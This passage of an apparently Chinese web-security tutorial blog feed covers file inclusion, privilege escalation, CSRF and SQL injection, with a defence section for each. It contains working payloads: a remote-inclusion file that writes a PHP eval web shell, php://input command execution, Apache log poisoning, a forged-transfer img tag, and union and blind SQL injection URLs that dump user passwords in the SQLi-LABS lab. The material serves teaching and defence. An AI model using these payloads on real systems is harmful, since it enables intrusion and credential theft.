class="headerlink" title="利用："></a>利用：</h2><p><strong>前提：</strong></p><ol><li>Web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件;</li><li>用户能够控制该动态变量。</li></ol><h3 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h3><p><code>http://www.xxx.com/index.php?filname=/etc/passwd</code><em><strong>目标主机文件存在，且有相应权限</strong></em></p><h3 id="2、远程包含shell"><a href="#2、远程包含shell" class="headerlink" title="2、远程包含shell"></a>2、远程包含shell</h3><p>若<code>allow_url_fopen=on</code>，可尝试远程包含一句话木马。</p><p>示例：</p><p>个人服务器地址:<strong><a href="http://twowards.top/">http://twowards.top</a></strong></p><p>在网站根目录准备<strong>echo.txt</strong>文件代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fputs(fopen("shell.php","w"),"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>")</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>代码解析：</p></li><li><p>fputs(要写入的打开文件,写入的字符串内容)</p></li><li><p>fopen(规定要打开的文件，访问此文件的类型，此处为写入w)</p></li></ul><p>访问<code>http://www.xxx.com/index.php?filname=http://twowards.top/echo.txt</code>，将会在index.php所在目录生成木马文件shell.php<code>&lt;?php eval($_POST[cmd]);?&gt;</code></p><h3 id="3、本地包含配合文件上传"><a href="#3、本地包含配合文件上传" class="headerlink" title="3、本地包含配合文件上传"></a>3、本地包含配合文件上传</h3><p>若网站提供文件上传功能，通过文件上传上传木马到服务器后使用本地文件包含进行利用。</p><p><em><strong>直接利用文件上传访问木马可能会无法解析，所以要配合文件包含漏洞。</strong></em></p><h3 id="4、php伪协议"><a href="#4、php伪协议" class="headerlink" title="4、php伪协议"></a>4、php伪协议</h3><p>以参数为filename示例：</p><table><thead><tr><th>协议</th><th>用法</th><th>含义</th></tr></thead><tbody><tr><td>file://</td><td>?filename=file://绝对路径</td><td>访问本地文件系统</td></tr><tr><td>php://filter</td><td>?filename=filter/read=convert.base64-encode/resource=xxx.php</td><td>读取源码（此处读取到base64加密后的源码）</td></tr><tr><td>php://input</td><td>?filename=php://input【POST DATA】<?php phpinfo()?></td><td>执行php代码。前提：allow_url_include=on</td></tr></tbody></table><p>补充：php://input 用post提交php代码时，可提交<code>&lt;?php system(&#39;xxx&#39;)?&gt;</code>来执行系统命令。如：<code>&lt;?php system(&#39;net user&#39;)?&gt;</code>查看用户</p><h3 id="5、包含apache日志文件"><a href="#5、包含apache日志文件" class="headerlink" title="5、包含apache日志文件"></a>5、包含apache日志文件</h3><p>当php文件存在本地包含漏洞时，却无法上传文件时，导致无法深度利用。Apache日志文件也是另一种思路。</p><p>前提：可找到Apache日志路径</p><p>原理：</p><p>Apache运行后通常默认生成两个日志文件access.log（访问日志），error.log（错误日志）。access.log记录了客户端每次请求服务器响应的相关信息。当访问资源不存在时，同样也会记录。</p><p>示例：</p><p>当请求：<code>http://www.xxx.com/&lt;?php phpinfo();?&gt;</code>时，Apache会记录<code>&lt;?php phpinfo?&gt;</code>，并写入access.log。</p><p>然而到此处并不能直接包含此日志文件：一句话木马在日志里发生了变形。如下：</p><p><code>127.0.0.1 - - [19/Nov/2021:15:00:00 +0800] &quot;GET /%3C?php%20phpinfo();%3E&quot;</code></p><p>可以看到php中的<code>&lt; &gt;空格</code>被浏览器进行了转码。</p><p>此时攻击者可利用BurpSuite来绕过编码，之后使用包含漏洞来包含access.log，去执行其中php代码。</p><p>补充：安全起见，Apache安装时尽量不要使用默认路径。</p><h2 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h2><p>1、严格控制包含中参数是否外部可控。</p><p>2、路径限制：限制被包含文件只能在某一文件夹内，禁止目录跳转字符。如<code>./</code>。</p><p>3、包含验证：被包含文件是否在白名单中。</p><p>4、尽量不使用动态包含，固定包含文件如：include(“head.php”);。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑越权介绍</title>
      <link href="/2022/01/15/luo-ji-yue-quan/"/>
      <url>/2022/01/15/luo-ji-yue-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑漏洞-越权介绍"><a href="#逻辑漏洞-越权介绍" class="headerlink" title="逻辑漏洞-越权介绍"></a>逻辑漏洞-越权介绍</h1><p>越权：越-&gt;超越；权-&gt;权限</p><h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>​    获取到同一级别其他用户的权限</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>获取到不同级别的使用者的权限</p><ul><li>向上越权-&gt;下级获得上级权限</li><li>向下越权-&gt;上级获得下级(隐私)权限</li></ul><p><strong>eg</strong>：一个网站、管理员admin，可以增添用户、删除用户…</p><p>​        用户:user-1,user-2…可发布公开内容，隐私内容等等。</p><p><strong>水平越权</strong>：user-1拿到user-2的权限，可查看user-2发布的隐私内容，以user-2的身份进行一些非法操作。</p><p><strong>垂直越权</strong>：</p><p>向上越权：user-1拿到admin的权限，非法进行增删用户等操作。</p><p>向下越权：admin拿到user-1或user-2的权限，进行非法查看隐私内容等操作</p><h2 id="验证："><a href="#验证：" class="headerlink" title="验证："></a>验证：</h2><p>1、请求中不存在参数，只用cookie进行身份验证，则不可越权；</p><p>2、请求中存在参数，且参数中的某些值可能是辨识用户身份的<strong>唯一</strong>值如employeeID、departmentID、ID等。</p><p><strong>水平越权</strong>：用两个浏览器同时注册user-1，user-2两个普通用户。在相同界面同时进行抓包对比，寻找代表其身份的参数，修改参数进行重放，若访问成果，则存在水平越权。</p><p><strong>垂直越权</strong>：</p><p>以向上越权为例：抓包寻找辨识用户身份的唯一值，替换为管理员的参数，进行重放，若访问成功，则存在垂直越权。</p><p><strong>问题：</strong>如何寻找代表管理员的身份唯一值？</p><p>1、若该值为有规律数字可进行枚举。2、可在站点寻找是否有可利用信息进行构造。3、下载站点源代码进行本地搭建、注册管理员账户进行测试。</p><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>可用burpsuite 插件authz进行测试验证。</p><h2 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h2><p>执行关键操作时验证用户身份，判断其是否具有操作权限。</p><p>对标识用户唯一身份的参数进行加密，防止用户进行枚举。</p><p>服务器对每个页面链接进行权限判断。</p><p>用户登录后不再以客户端用户提交的登录信息作为依据，而是以会话中服务端存在的已登陆用户信息为准。</p><p>最小权原则。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞介绍</title>
      <link href="/2022/01/15/csrf/"/>
      <url>/2022/01/15/csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h1><h2 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h2><p>CSRF（Cross-site request forgery），跨站请求伪造。</p><p>​    攻击者盗用了你的身份，以你的名义对服务器进行请求（请求伪造），服务器误以为这个请求是由你来进行发送的。导致攻击者成功的完成了他的非法操作。如：修改密码，非法转账等。（危害取决于你的权限有多大）</p><h2 id="CSRF分类"><a href="#CSRF分类" class="headerlink" title="CSRF分类"></a>CSRF分类</h2><ul><li><p>GET</p></li><li><p>POST</p><p>对于CSRF来说，GET、POST是没有任何区别的，只是POST请求方式多了一些代码。</p></li></ul><h2 id="CSRF漏洞利用过程："><a href="#CSRF漏洞利用过程：" class="headerlink" title="CSRF漏洞利用过程："></a>CSRF漏洞利用过程：</h2><p><em><strong>本故事纯属虚构，重在理解利用过程</strong></em></p><p>1、<strong>小胖</strong>在银行有一笔巨款，这天他登陆了这个银行的网站准备将这笔巨款转给他的爸爸<strong>Jaa</strong>。假设转账url地址为<code>http://www.xxxbank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=Jaa</code></p><p>2、在<strong>小胖</strong>将要转账时，看到了一个带有诱惑的图片，已登陆银行网站的<strong>小胖</strong>因抵制力不足，点击了这张图片。（该图为黑客<strong>zsan</strong>构造的恶意链接，<code>&lt;img src=&quot;http://www.xxxbank.com/withdraw?account=xiaopang&amp;amount=1000&amp;for=zsan&quot;&gt;)</code></p><p>3、而在服务器看来这是一次正常的请求，即<strong>小胖</strong>给<strong>zsan</strong>转账1000元，小胖白白损失了这笔巨款。</p><p>漏洞利用前提：</p><p>1、登录受信任网站A、并在本地生成cookie。</p><p>2、在没有登出的情况下，访问恶意网站B。</p><h2 id="检测CSRF漏洞"><a href="#检测CSRF漏洞" class="headerlink" title="检测CSRF漏洞"></a>检测CSRF漏洞</h2><p>​    注册合法用户，确认该用户可执行哪些敏感操作如：修改密码、修改删除敏感信息、发表留言、转账等。</p><p>确认敏感操作后，构造CSRF POC进行修改。（劫持用户操作）</p><p><em><strong>Burp Suite提供了CSRF POC的构造方法</strong></em></p><p>可在敏感操作处使用<strong>Burp Suite</strong>进行抓包、右键选择<strong>Engagement tools</strong> – <strong>Generate CSRF PoC</strong>来伪造请求。</p><h2 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h2><p>1、二次确认</p><p>​    在进行敏感操作时对用户身份进行二次确认，如再次输入密码。或在敏感操作时要求用户输入验证码。</p><p>2、验证HTTP Referer字段</p><p>​    在HTTP协议中，Referer字段记录了该HTTP请求的来源地址。当用户通过黑客的地址向网站发送请求时，该请求的Referer字段指向的是黑客的地址，所以只要对每一个敏感请求验证他的来源地址是否与合法请求者为同一个地址，便可判断是否为合法请求。然而这种方法并非完全可靠，攻击者往往可以通过二次抓包伪造referer值来绕过验证。</p><p>3、 Token认证</p><p>​    Token 是在服务端产生的。当用户成功登录信息后，服务端返产生Token随机值给分配给用户，并同时存储在Session中，当用户访问某些界面时，该值会直接传递在用户界面或者Cookie中。当用户提交请求时，该Token值也会随之提交，服务器收到数据后，会判断该值是否与Session中存储的一致。若一致，则为合法请求，否则可能是CSRF攻击。</p><p>补充：若为GET请求，则考虑使用在Cookie中存储Token。</p><p>​    当网站同时存在XSS、CSRF漏洞时，Token防御机制会失效，攻击者可通过JavaScript获取Tocen值。因此，当网站存在XSS时，使用Token防范CSRF是没有任何意义的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入漏洞介绍</title>
      <link href="/2022/01/15/sql-zhu-ru-lou-dong-jie-shao/"/>
      <url>/2022/01/15/sql-zhu-ru-lou-dong-jie-shao/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入漏洞介绍"><a href="#SQL注入漏洞介绍" class="headerlink" title="SQL注入漏洞介绍"></a>SQL注入漏洞介绍</h1><h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><p><strong>原理：</strong></p><ul><li><p>Sql注入，由于Web应用程序对用户输入数据的合法性没有判断和过滤，导致后台SQL语句拼接了用户的输入。用户可以通过构造不同的Sql语句来实现对数据库的任意操作。（如：增删改查）。</p><p>解释：当我们用户在前端浏览器页面做一些事情的时候，当需要与数据库进行交互时，比如最简单的登陆账号，web应用程序接收到我们账号密码后，需要后台有这样一个数据库的命令，去查询数据库中是否有这样的一个账号密码与之对应，然后做出判断：是否存在用户名，若存在，用户名与密码是否相匹配。然而，当数据库的这个命令直接被用户去操控，用户直接对数据库进行任意操作。这样所带来的隐患是极其严重的。我们称之为存在SQL注入漏洞。</p></li></ul><p><strong>起因：</strong></p><p>为什么会有SQL注入？</p><ul><li>代码对带入SQL语句的参数过滤不严格</li><li>未启用框架的安全配置，例如：PHP的magic_quotes_gpc</li><li>未使用框架安全的查询方法</li><li>测试接口未删除</li><li>未启用防火墙</li><li>未使用其他的安全防护设备</li><li>… …</li></ul><p><strong>危害 ：</strong></p><p>这些危害包括但不局限于:</p><ul><li>数据库信息泄漏:数据库中存放的用户的隐私信息的泄露。</li><li>网页篡改:通过操作数据库对特定网页进行篡改。</li><li>网站被挂马。传播恶意软件:修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作。数据库服务器被攻击。数据库的系统管理员帐户被窜改。</li><li>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控“制操作系统。</li><li>破坏读盘数据,瘫痪全系统。 一些类型的数据库系统能够让Sql指令操作文件系统，这使得Sql注入的危害被进一步放大。</li><li>……</li></ul><p><strong>场景：</strong></p><p>哪些地方可能会存在SQL注入？</p><pre><code>        所有与数据库进行交互的地方：</code></pre><ul><li>登陆框</li><li>搜索框</li><li>详情页</li><li>提交按钮</li><li>… …</li></ul><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>以下所有内容除特殊强调外数据库均为Mysql</strong></p><p>先来了解一下Mysql的一些基础结构把</p><p>数据库:information_schema(存放数据库元信息) </p><p>其中三张常用的表 </p><ul><li>schemata (存放数据库名) </li><li>tables    (存放表名)</li><li> columns(存放字段名)</li></ul><p>schemata表： </p><ul><li>schema_name字段用来存储数据库名 </li></ul><p>tables表： </p><ul><li>table_schema(数据库名) </li><li>table_name(表名)</li></ul><p> columns表： </p><ul><li>table_schema(数据库名) </li><li>table_name(表名) </li><li>column_name(字段名)</li></ul><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>SQL注入的类型很多，但不是严格的进行区分的。如<strong>报错注入</strong>可发生在GET型注入中，也可发生在POST型注入中，以下列举几种常见的分类：</p><p>按照请求方法分类</p><ul><li>GET型注入</li><li>POST型注入</li></ul><p>按照SQL数据类型分类</p><ul><li>整型注入</li><li>字符型注入</li></ul><p>其他类型</p><ul><li>报错注入</li><li>布尔盲注</li><li>时间盲注</li><li>Cookie注入</li><li>User-Agent注入</li><li>… …</li></ul><h2 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h2><pre><code>当我们在进行SQL注入时，首先要判断他的注入点。其目的便是尽可能地使数据库去执行我们的输入：</code></pre><ul><li>单引号’、双引号”、单括号）、双括号））等看看是否报错，如果报错就<strong>可能</strong>存在SQL注入漏洞了。</li><li>在url后加and 1=1 、and 1=2、 -0、 +0、 .0、 .1等查看页面回显是否一样来判断所输入的数据是否被当作数据库命令执行。（部分注入存在回显不明显，可通过审查元素或者使用BurpSuite进行查看）</li></ul><h2 id="下面我们用SQLi-LABS-为实验环境进行展开分析"><a href="#下面我们用SQLi-LABS-为实验环境进行展开分析" class="headerlink" title="下面我们用SQLi-LABS 为实验环境进行展开分析"></a><strong>下面我们用SQLi-LABS 为实验环境进行展开分析</strong></h2><h2 id="1、联合查询"><a href="#1、联合查询" class="headerlink" title="1、联合查询"></a>1、联合查询</h2><h3 id="整型注入"><a href="#整型注入" class="headerlink" title="整型注入"></a>整型注入</h3><p><img src="https://img-blog.csdnimg.cn/20210204153118535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>在url后输入?id=1</li><li>通过不断切换id的值我们发现页面会转换为不同的内容</li><li>当在数字后加入单引号时：?id=1’，我们发现页面有报错信息（此时可能存在sql注入。根据报错信息我们可以分析出错的地方在单引号 ‘ ）</li><li>继续输入and 1=1 发现页面没有变化 输入and 1=2 页面发生了变化（此时可以确定我们的输入已经被执行，该处存在SQL注入漏洞）接下来我们要进一步获取信息</li><li>通过order by 后加数字来判断有多少个字段若 order by 2返回正常 则说明字段数大于等于2。由该处 order by 3正常 order by 4返回错误可判断字段数为3</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过union select 联合查询 使用占位数字列出当前字段（要想输入占位符生效须使前面的条件否定 可使用and 1=2 或 id=-1）</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;2 union select 1,2,3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153158773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>使用函数version(),database()替换占位数字回显出数据库<strong>版本信息</strong>和<strong>名称</strong> </li></ul><p><img src="https://img-blog.csdnimg.cn/20210204153222162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>之后我们可以通过union select 进一步获取信息</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(schema_name),3 from  information_schema.schemata获取所有数据库<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153252420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(table_name),3 from  information_schema.tables where table_schema&#x3D;&#39;security&#39;获取当前数据库&#39;security&#39;所有的表<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2021020415330714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; 获取users表的所有字段<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2021020415331879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们知道了users表的存在，又知道表中有 id ，username， password三列，那么我们可以查询他的内容了</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(id,&#39;-&#39;,username,&#39;-&#39;,password),3 from users <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153341749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><pre><code>在我们常见的数据库语句中，大多数参数会被一些符号（单引号，双引号、括号等的）进行包裹。例如这条语句：</code></pre><pre class="line-numbers language-none"><code class="language-none">$query&#x3D;&quot;select first_name from users where id&#x3D;&#39;$_GET[&#39;id&#39;]&#39;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>可以看到参数被单引号包裹着如果此时我们输入</code></pre><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1 union select database();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>则在数据库中是这样子的</code></pre><pre class="line-numbers language-none"><code class="language-none">select first_name from users where id&#x3D;&#39;1 union select database()&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>然而我们并没有id值等于1 union select database()  显然这样是无效的因此我们可以这样输入</code></pre><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; union select database() #;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>我们用单引号 &#39; 来闭合前边的内容，用#注释掉后边的内容。（若#注释失败可以使用 --+ 来注释 或者 --空格）这样在数据库中的    语句为：</code></pre><pre class="line-numbers language-none"><code class="language-none">select first_name from users where id&#x3D;&#39;1&#39; union select database()  #&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>这样的话便可以顺利的进行下一步的注入。（除了这点区别外其他步骤可以参照**整型注入**）我们来看一下都有哪些类型的字符型注入。</code></pre><ul><li>单引号包裹</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153417521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>单引号+括号包裹</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-3&#x2F;?id&#x3D;-1&#39;) union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153429543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>双引号＋括号包裹</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-4&#x2F;?id&#x3D;-1&quot; )union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153440942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="2、盲注"><a href="#2、盲注" class="headerlink" title="2、盲注"></a>2、盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>当页面返回信息没有报错,或者没有返回一些数据的时候,我们可以通过页面状态发生的变化来判断字符的数据。</p><p>布尔盲注，则根据布尔类型的数据（真或假）来判断后台的数据。</p><p>如：SQLi-LABS-less5</p><p>在此之前我们需要认识一些函数：</p><ul><li>substr(string,start,length)             //substr截取字符串三个参数分别为：被截取的字符串，截取字符串起始的位置，截取字符串的偏移量 如：substr(hello,2,3 )则返回：ell                                        （<strong>注意：substr截取从1开始</strong>）</li><li>ascii()</li><li>count()                                              //列出列名数量</li><li>length()                                            //返回长度</li><li>concat(‘’,’’)                                        //字符串拼接，参数也可为变量</li><li>limit m,n                                          //从m行开始，到m+n行                                              （<strong>注意：limit截取从0开始</strong>）</li></ul><p>我们按照之前的方法：当我们在url后输入?id=1的时候可以看到界面出现了You are in…….. 如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20210204153528529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>当加上单引号之后，我们看到了页面报错。</p><p><img src="https://img-blog.csdnimg.cn/20210204153548892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>我们在末尾加上–+之后，发现页面返回了正常。（You are in…….. ）</p><p><img src="https://img-blog.csdnimg.cn/20210204153559817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>由之前学习的知识我们可以知道，这是一个参数由单引号包裹的字符型注入。</p><p>然而我们当我们继续查询下去的时候会发现：当我们输入不同的语句时，页面只会返回两种状态：</p><ul><li>当输入语句为真时，会出现如上图的  You are in…….. </li><li>当输入的语句为假时，则不会出现   You are in……..  如下图所示：</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153610566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>很显然You are in…….. 的出现，代表着结果为真，否则代表着结果为假。</p><p>那么，我们该如何继续查询更多的信息呢？</p><p>我们不妨输入这样的语句进行查询：</p><ul><li>查询version()第一个字符。是否为b</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and substr(version(),1,1)&#x3D; &#39;b&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到返回结果为假。然而这样查询的弊端是显而易见的：光英文字母区分大小写便有52个字符，再加上其他字符，显然会耗费大量的精力。</p><p>我们引入另一个函数<strong>ascii()</strong> ,将字符转换为码。(共128个字符)</p><p>那么我们可以这样查询：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(version(),1,1))&gt; 100--+         假http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(version(),1,1))&gt; 50--+          真http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(version(),1,1))&gt; 60--+          假...http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(version(),1,1))&#x3D; 53--+          真<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153623681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>对照码表查看，53对应的是字符为数字5。这样我们可以知道version()值第一个字符为数字5。</p><p>我们继续进行查询：（以下内容省略了盲猜的过程）</p><ul><li>判断数据库长度</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8--+长度为8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li> 依次确定数据库名称组成</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),1,1))&#x3D; 115--+shttp:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),2,1))&#x3D; 101--+e...security<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>判断数据表的个数</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;0--+真...http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;4--+表的个数为4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>判断表的长度</li></ul><pre class="line-numbers language-none"><code class="language-none">and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;0--+&#x2F;&#x2F;判断第一张表的长度<span aria-hidden="true" 